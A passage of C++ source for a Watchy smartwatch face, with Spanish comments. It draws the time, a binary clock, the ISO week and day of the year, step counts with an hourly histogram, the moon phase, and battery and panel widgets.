  uint8_t pct = batteryPercent(vbat);
  snprintf(buf, sizeof(buf), "%u%%", pct);
  int16_t tx = title(R - 6, A_TOP, buf, true, pct <= 15, 24);
  batteryIcon(tx + textWidth(buf) + 4, A_TOP - 4, pct);

  // hora: Spleen 32x64. Tinta de los dígitos 24 px (offset 4); ':' 4 px (offset 14)
  const int16_t DIGIT = 24, COLON = 4, GAP = 8, CGAP = 10;
  const int16_t width = 4 * DIGIT + 2 * GAP + COLON + 2 * CGAP;   // 140 px
  const int16_t base  = A_TOP + 15 + 40;                           // línea base
  int16_t x = (200 - width) / 2;
  char d[4] = {
    (char)('0' + currentTime.Hour / 10),   (char)('0' + currentTime.Hour % 10),
    (char)('0' + currentTime.Minute / 10), (char)('0' + currentTime.Minute % 10)};
  display.setFont(&Spleen32x64);
  for (uint8_t i = 0; i < 4; i++) {
    display.setCursor(x - 4, base);
    display.print(d[i]);
    x += DIGIT;
    if (i == 1) {
      x += CGAP;
      display.setCursor(x - 14, base);
      display.print(':');
      x += COLON + CGAP;
    } else {
      x += GAP;
    }
  }

  // reloj binario debajo: 5 bits de hora · 6 bits de minuto
  binaryClock(100, base + 7);

  // a los lados del reloj binario: semana y día del año, en plan nerd
  static const uint16_t DOY[] = {0, 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334};
  int year = currentTime.Year + 1970;
  bool leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;
  int doy = DOY[mo] + currentTime.Day + ((leap && mo > 2) ? 1 : 0);
  int dow = (currentTime.Wday + 5) % 7 + 1;                          // lunes = 1 ... domingo = 7
  int week = (doy - dow + 10) / 7;                                   // semana ISO 8601
  if (week < 1)                   week = isoWeeksInYear(year - 1);
  else if (week > isoWeeksInYear(year)) week = 1;
  display.setFont(&Spleen5x8);
  snprintf(buf, sizeof(buf), "w%02d", week);
  display.setCursor(L + 8, base + 12);
  display.print(buf);
  snprintf(buf, sizeof(buf), "d%03d", doy);
  textRight(R - 7, base + 12, buf);
}

void WatchyHackchyOS::binaryClock(int16_t cx, int16_t y) {
  const int16_t S = 4, P = 6, SEP = 10;
  const int16_t width = 5 * P - (P - S) + SEP + 6 * P - (P - S);
  int16_t x = cx - width / 2;
  for (int8_t b = 4; b >= 0; b--, x += P) {
    if ((currentTime.Hour >> b) & 1) display.fillRect(x, y, S, S, fg());
    else                             display.drawRect(x, y, S, S, fg());
  }
  x += SEP - (P - S);
  for (int8_t b = 5; b >= 0; b--, x += P) {
    if ((currentTime.Minute >> b) & 1) display.fillRect(x, y, S, S, fg());
    else                               display.drawRect(x, y, S, S, fg());
  }
}

// ---------------------------------------------------------------------------
//  Panel de pasos
// ---------------------------------------------------------------------------
void WatchyHackchyOS::drawStepsPanel(uint32_t steps) {
  panel(L, B_TOP, R, B_BOT);
  title(L + 6, B_TOP, "pasos");

  uint32_t pct = steps * 100UL / STEP_GOAL;
  char buf[24];
  snprintf(buf, sizeof(buf), "%lu%% de %u", (unsigned long)(pct > 999 ? 999 : pct), (unsigned)STEP_GOAL);
  title(R - 6, B_TOP, buf, true);

  const int16_t IX0 = L + 7, IX1 = R - 7;            // interior útil: 182 px

  // número + distancia
  snprintf(buf, sizeof(buf), "%lu", (unsigned long)steps);
  display.setFont(&Spleen12x24);
  display.setCursor(IX0 - 1, B_TOP + 26);
  display.print(buf);
  uint32_t dm = steps * 75UL / 1000UL;               // centésimas de km (zancada 0,75 m)
  snprintf(buf, sizeof(buf), "%lu,%lu km", (unsigned long)(dm / 100), (unsigned long)((dm % 100) / 10));
  display.setFont(&Spleen6x12);
  textRight(IX1, B_TOP + 26, buf);

  // barra segmentada: 46 segmentos de 3 px con 1 px de hueco (183 px)
  const int16_t yBar = B_TOP + 32;
  const uint8_t SEGS = 46;
  uint8_t full = pct >= 100 ? SEGS : (uint8_t)(pct * SEGS / 100);
  for (uint8_t i = 0; i < SEGS; i++) {
    int16_t sx = IX0 + i * 4;
    if (i < full) display.fillRect(sx, yBar, 3, 4, fg());
    else          display.drawPixel(sx + 1, yBar + 3, fg());
  }

  // histograma por horas
  const int16_t pitch = 7, barW = 5, H = 15;
  const int16_t yBase = B_TOP + 56;
  const int16_t x0 = IX0 + (IX1 - IX0 + 1 - (24 * pitch - (pitch - barW))) / 2;
  const int16_t xEnd = x0 + 24 * pitch - (pitch - barW);
  uint16_t peak = 300;                               // escala mínima
  for (uint8_t h = 0; h < 24; h++) if (htHourSteps[h] > peak) peak = htHourSteps[h];

  for (uint8_t h = 0; h <= currentTime.Hour && h < 24; h++) {
    uint16_t v = htHourSteps[h];
    int16_t bh = v ? (int16_t)((v * (uint32_t)H + peak - 1) / peak) : 0;
    int16_t bx = x0 + h * pitch;
    if (h == currentTime.Hour) {                     // hora en curso: hueca
      if (bh < 3) bh = 3;
      display.drawRect(bx, yBase - bh - 1, barW, bh, fg());
    } else if (bh) {
      display.fillRect(bx, yBase - bh - 1, barW, bh, fg());
    }
  }
  int16_t now = x0 + currentTime.Hour * pitch + barW;
  display.drawFastHLine(x0, yBase, now - x0, fg());                 // pasado: continuo
  for (int16_t x = now + 1; x < xEnd; x += 2) display.drawPixel(x, yBase, fg()); // futuro

  display.setFont(&Spleen5x8);
  for (uint8_t h = 0; h <= 24; h += 6) {
    int16_t tx = (h < 24) ? x0 + h * pitch : xEnd - 1;
    display.drawFastVLine(tx, yBase + 1, 2, fg());
    char lbl[4];
    snprintf(lbl, sizeof(lbl), "%02d", h);
    if (h < 24) { display.setCursor(tx, yBase + 10); display.print(lbl); }
    else        textRight(xEnd, yBase + 10, lbl);
  }
}

// ---------------------------------------------------------------------------
//  Paneles inferiores
// ---------------------------------------------------------------------------
double WatchyHackchyOS::moonPhase() {
  int y = currentTime.Year + 1970, m = currentTime.Month, d = currentTime.Day;
  int a = (14 - m) / 12, yy = y + 4800 - a, mm = m + 12 * a - 3;
  long jdn = d + (153 * mm + 2) / 5 + 365L * yy + yy / 4 - yy / 100 + yy / 400 - 32045;
  double jd = jdn + (currentTime.Hour - 12) / 24.0 + currentTime.Minute / 1440.0;
  const double SYNODIC = 29.530588853;
  double age = fmod(jd - 2451550.26, SYNODIC);       // luna nueva de referencia: 6-ene-2000
  if (age < 0) age += SYNODIC;
  return age / SYNODIC;                              // 0 nueva, 0.5 llena
}

void WatchyHackchyOS::drawMoonPanel() {
  panel(L, C_TOP, C_SPLIT - 3, C_BOT);
  title(L + 6, C_TOP, "luna");

  double p = moonPhase();
  int illum = (int)((1.0 - cos(2.0 * M_PI * p)) * 50.0 + 0.5);
  char buf[8];
  snprintf(buf, sizeof(buf), "%d%%", illum);
  title(C_SPLIT - 9, C_TOP, buf, true);

  int16_t cy = (C_TOP + C_BOT) / 2 + 1;
  moonIcon(L + 13, cy, 5, p);
  display.setFont(&Spleen6x12);
  display.setCursor(L + 25, cy + 4);
  display.print(FASES[(uint8_t)(p * 8.0 + 0.5) % 8]);
}

void WatchyHackchyOS::drawYesterdayPanel() {
  panel(C_SPLIT + 3, C_TOP, R, C_BOT);
  title(C_SPLIT + 9, C_TOP, "ayer");

  char buf[24];
  uint32_t pct = htYesterday * 100UL / STEP_GOAL;
  snprintf(buf, sizeof(buf), "%lu%%", (unsigned long)(pct > 999 ? 999 : pct));
  title(R - 6, C_TOP, buf, true, pct >= 100);         // en negativo si llegó a la meta

  snprintf(buf, sizeof(buf), "%lu pasos", (unsigned long)htYesterday);
  int16_t cy = (C_TOP + C_BOT) / 2 + 1;
  display.setFont(&Spleen6x12);
  display.setCursor(C_SPLIT + 10, cy + 4);
  display.print(buf);
}

// ---------------------------------------------------------------------------
//  Widgets
// ---------------------------------------------------------------------------
void WatchyHackchyOS::panel(int16_t x0, int16_t y0, int16_t x1, int16_t y1) {
  // marco de 1 px con esquinas redondeadas (1 px en diagonal)
  display.drawFastHLine(x0 + 2, y0, x1 - x0 - 3, fg());
  display.drawFastHLine(x0 + 2, y1, x1 - x0 - 3, fg());
  display.drawFastVLine(x0, y0 + 2, y1 - y0 - 3, fg());
  display.drawFastVLine(x1, y0 + 2, y1 - y0 - 3, fg());
  display.drawPixel(x0 + 1, y0 + 1, fg());
  display.drawPixel(x1 - 1, y0 + 1, fg());
  display.drawPixel(x0 + 1, y1 - 1, fg());
  display.drawPixel(x1 - 1, y1 - 1, fg());
}

// Texto incrustado en la línea superior de un panel: ┤texto├
// extra = píxeles reservados a la derecha del texto (p. ej. para un icono)
int16_t WatchyHackchyOS::title(int16_t x, int16_t line, const char *s,
                              bool alignRight, bool inverted, int16_t extra) {
  display.setFont(&Spleen6x12);
  int16_t w = textWidth(s) + extra;
  if (alignRight) x -= w;
  display.fillRect(x - 3, line, w + 6, 1, bg());          // hueco en la línea
  display.drawFastVLine(x - 4, line - 1, 3, fg());        // remates
  display.drawFastVLine(x + w + 3, line - 1, 3, fg());
  if (inverted) {
    display.fillRect(x - 2, line - 5, w - extra + 4, 11, fg());
    display.setTextColor(bg());
  }
  display.setCursor(x, line + 4);
  display.print(s);
  display.setTextColor(fg());
  return x;
}

void WatchyHackchyOS::batteryIcon(int16_t x, int16_t y, uint8_t pct) {
  display.drawRect(x, y, 18, 9, fg());                    // cuerpo
  display.fillRect(x + 18, y + 3, 2, 3, fg());            // borne
  uint8_t segs = (pct + 12) / 25;                         // 0..4
  for (uint8_t i = 0; i < 4; i++)
    if (i < segs) display.fillRect(x + 2 + i * 4, y + 2, 3, 5, fg());
}

void WatchyHackchyOS::moonIcon(int16_t cx, int16_t cy, int16_t r, double p) {
  double k = cos(2.0 * M_PI * p);
  for (int16_t dy = -r; dy <= r; dy++) {
    for (int16_t dx = -r; dx <= r; dx++) {
      double x = (dx + 0.5) / (r + 0.5), y = (dy + 0.5) / (r + 0.5);
      if (x * x + y * y > 1.0) continue;
      double w = sqrt(1.0 - y * y);
      if (MOON_SOUTH) x = -x;
      if ((p < 0.5) ? (x > k * w) : (x < -k * w)) display.drawPixel(cx + dx, cy + dy, fg());
    }
  }
  display.drawCircle(cx, cy, r + 2, fg());                // aro exterior
}

uint8_t WatchyHackchyOS::batteryPercent(float vbat) {
  // Aproximación lineal de una LiPo: 3.30 V = 0 %, 4.20 V = 100 %
  int pct = (int)((vbat - 3.30f) / (4.20f - 3.30f) * 100.0f + 0.5f);
  return pct < 0 ? 0 : (pct > 100 ? 100 : pct);
}

int16_t WatchyHackchyOS::textWidth(const char *s) {
  int16_t x1, y1; uint16_t w, h;
  display.getTextBounds(s, 0, 100, &x1, &y1, &w, &h);
  return (int16_t)w + x1;
}

void WatchyHackchyOS::textRight(int16_t xRight, int16_t baseline, const char *s) {
  int16_t x1, y1; uint16_t w, h;
  display.getTextBounds(s, 0, baseline, &x1, &y1, &w, &h);
  display.setCursor(xRight - (int16_t)w - x1, baseline);
  display.print(s);
}
